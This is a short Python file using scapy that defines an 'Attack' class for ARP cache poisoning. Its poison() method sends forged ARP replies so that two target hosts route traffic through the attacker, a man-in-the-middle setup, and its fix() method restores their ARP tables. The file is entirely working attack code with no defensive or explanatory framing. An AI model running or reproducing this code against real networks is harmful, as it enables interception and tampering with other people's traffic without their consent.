from logging import getLogger, ERROR
from scapy import *

class Attack:
    def __init__(self, targets, interface):
        self.target1 = targets[0]
        self.target2 = targets[1]
        self.interface = interface

    # set the src to be the man in the middle
    def poison(self, macs):
        send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst=macs[0]), iface=self.interface)
        send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst=macs[1]), iface=self.interface)

    # reverse the poison
    def fix(self, macs):
        send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst='ff:ff:ff:ff:ff:ff',hwsrc=macs[0]), iface=self.interface)
        send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst='ff:ff:ff:ff:ff:ff',hwsrc=macs[1]), iface=self.interface)
